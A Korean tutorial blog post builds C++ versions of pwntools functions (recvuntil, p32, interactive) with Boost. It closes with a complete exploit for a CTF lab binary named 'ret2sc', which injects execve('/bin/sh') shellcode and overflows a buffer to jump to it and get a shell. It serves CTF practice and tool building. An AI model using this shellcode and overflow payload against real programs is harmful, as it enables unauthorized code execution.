
## **recvuntil**


라이브러리로 작성된 완전한 코드는 아래에서 확인 가능하다.<br>
[https://github.com/lucid78/pwntoolscpp](https://github.com/lucid78/pwntoolscpp){: target="_blank"}
{: .notice--info}


recvuntil() 함수는 이 함수에 전달된 파라미터 문자가 대상의 출력에서 발견될 때까지 읽어들이는 함수이다.
<br>
C에서라면 read() 함수로 문자를 1바이트씩 읽으면서 delim 문자인지 확인을 하는 꽤 귀찮은 작업을 거쳐야 하지만, boost에서는 boost::asio::read_until이라는 함수가 이 기능을 지원한다.
([https://www.boost.org/doc/libs/1_70_0/doc/html/boost_asio/reference/read_until.html](https://www.boost.org/doc/libs/1_70_0/doc/html/boost_asio/reference/read_until.html))

boost::asio::read_until()의 사용법은 아래와 같다.

```cpp
boost::asio::streambuf buf;   // pipe에서 읽은 data를 저장하는 buffer
buf.prepare(4096);            // buffer의 크기 설정
    
auto size = boost::asio::read_until(output, buf, delim);
std::cout << std::string(buffers_begin(buf.data()), buffers_begin(buf.data()) + size) << std::endl;
buf.consume(size);
```
<br>
세번째 파라미터가 delim으로 변경된 것 외에는 이전에 살펴보았던 boost::asio::read()와 사용법이 동일하다.
<br>
위의 코드는 구분자 delim 문자열을 파라미터로 입력받아 read_until()을 호출하여 해당 문자열이 발견되었을 때까지의 출력을 반환한다.

아래는 위의 코드를 바탕으로 추가한 recv_until() 함수가 추가된 전체 코드와 그 실행 결과이다.
<br>
ret2sc 실행 시 출력되는 Name을 recv_until()가 제대로 읽는지 확인하기 위해 init() 함수에서 read_at_once()를 주석 처리하였다.

```cpp
#include <iostream>
#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <mutex>

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

    const std::string recv_until(const std::string& delim)
    {
        std::string str;
        boost::asio::streambuf buf;
        buf.prepare(buffer_length);
        if(const auto size{boost::asio::read_until(output, buf, delim, ec)}; size != 0)
        {
            if(ec && ec != boost::asio::error::eof)
            {
                throw boost::system::system_error(ec);
            }
            str += buffer_to_string(buf, size);
            buf.consume(size);
        }
        return str;
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        // read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

int main()
{
    try
    {
        PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
        std::cout << p.recv_until(":") << std::endl;
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```
![full](/assets/images/recvuntil_1.png)

<br>
제대로 동작하는지 추가로 확인하기 위해 recv_until("m")을 한 결과는 아래와 같으며 정상적으로 동작하는 것을 알 수 있다.
![full](/assets/images/recvuntil_2.png)


## **p32**

p32() 함수는 전달된 int 형식의 주소를 32비트 little-endian 형식의 문자열로 바꿔주는 역할을 하는 함수이다. 예를 들어 이 함수에 0x12345678을 전달하면, \x78\x56\x34\x12 형태의 문자열을 반환한다. ([https://lclang.tistory.com/90](https://lclang.tistory.com/90))

boost를 이용하면 아래와 같이 쉽게 구현할 수 있다.

```cpp
const std::string conv_ascii(std::string hex)
{
    std::string ascii;
    for(size_t i = 0; i < hex.length(); i += 2)
    {
        auto part = hex.substr(i, 2);
        char ch = stoul(part, nullptr, 16);
        ascii += ch;
    }
    return ascii;
}

const std::string p32(const int& number)
{
    const int reversed{boost::endian::endian_reverse(number)};
    return conv_ascii((boost::format("%x") % reversed).str());
}
```


## **interactive**

이번에는 interactive() 함수를 구현해 보자.
<br>
interactive()는 마치 shell이 실행된 것 같은 인터페이스를 보여주는 함수인데, 실제로는 child process와의 read/write가 계속 반복되는 것이 기능의 전부이다. 따라서 앞에서 완성한 함수들을 약간만 수정하여 쉽게 구현할 수 있다.

아래는 추가된 interactive() 함수의 모습이다.
<br>
child process와의 통신 시 안정적인 data 전송을 위해 약간의 delay를 넣었다. 그리고 마치 /bin/sh이 동작하는 것처럼 화면 표시를 해주고, 전달받은 문자열을 write하고 read하여 화면에 출력한다.

```cpp
void interactive()
{
    locked_output("[*] Switching to interactive mode");
    while(true)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
        lock.lock();
        std::cout << "$ ";
        lock.unlock();

        std::string s;
        std::getline(std::cin, s);
        if(s.empty()) continue;
        send_line(s);
        recv_at_once();
    }
}
```

<br><br>
이제 shellcode를 이용해 실제로 제대로 동작하는지 검증해 보자. 아래는 pwntoolscpp를 이용해 제작한 exploit 코드이다.

```cpp
#include <iostream>
#include <mutex>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>


class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

    const std::string recv_until(const std::string& delim)
    {
        std::string str;
        boost::asio::streambuf buf;
        buf.prepare(buffer_length);
        if(const auto size{boost::asio::read_until(output, buf, delim, ec)}; size != 0)
        {
            if(ec && ec != boost::asio::error::eof)
            {
                throw boost::system::system_error(ec);
            }
            str += buffer_to_string(buf, size);
            buf.consume(size);
        }
        return str;
    }

    size_t send(const std::string& data)
    {
        const auto length{boost::asio::write(input, boost::asio::buffer(data, data.length()), ec)};
        if(ec && ec != boost::asio::error::eof){throw boost::system::system_error(ec);}
        
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::stringstream stream;
        stream << "0x" << std::hex << length;
        std::cout << std::endl;
        std::cout << "Sent " << std::hex << stream.str() << " bytes:" << std::endl;
        dump_hex(data.c_str(), data.size());
        
        return length;
    }

    size_t send_line(const std::string& data)
    {
        auto str{data};
        str.append("\n");
        return send(str);
    }

    void interactive()
    {
        locked_output("[*] Switching to interactive mode");
        while(true)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            lock.lock();
            std::cout << "$ ";
            lock.unlock();

            std::string s;
            std::getline(std::cin, s);
            if(s.empty()) continue;
            send_line(s);
            read_at_once();
        }
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        // read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void dump_hex(const void* data, size_t size)
    {
        char ascii[17] = {0};
        for(size_t i = 0; i < size; ++i)
        {
            printf("%02X ", ((unsigned char*)data)[i]);
            if(((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~')
            {
                ascii[i % 16] = ((unsigned char*)data)[i];
            }
            else
            {
                ascii[i % 16] = '.';
            }
            if((i+1) % 8 == 0 || i+1 == size)
            {
                printf(" ");
                if ((i+1) % 16 == 0)
                {
                    printf("|  %s \n", ascii);
                }
                else if (i+1 == size)
                {
                    ascii[(i+1) % 16] = '\0';
                    if ((i+1) % 16 <= 8)
                    {
                        printf(" ");
                    }
                    for (size_t j = (i+1) % 16; j < 16; ++j)
                    {
                        printf("   ");
                    }
                    printf("|  %s \n", ascii);
                }
            }
        }
        std::cout << std::endl;
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

const std::string conv_ascii(std::string hex)
{
    std::string ascii{""};
    for(size_t i = 0; i < hex.length(); i += 2)
    {
        const auto part{hex.substr(i, 2)};
        char ch = stoul(part, nullptr, 16);
        ascii += ch;
    }
    return ascii;
}

const std::string p32(const int& number)
{
    const int reversed{boost::endian::endian_reverse(number)};
    return conv_ascii((boost::format("%x") % reversed).str());
}

int main()
{
    try
    {

        PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
        std::cout << p.recv_until(":");

        char shellcode[] = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62"
                           "\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81"
                           "\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a"
                           "\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a"
                           "\x0b\x58\xcd\x80\x0a";
        p.send_line(shellcode);

        std::cout << p.recv_until(":");
        std::string payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        payload.append(p32(0x804a060));
        
        p.send_line(payload);
        p.interactive();
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```

<br>
아래와 같이 shell이 잘 뜨는 것을 확인할 수 있다.
![full](/assets/images/complete.png)


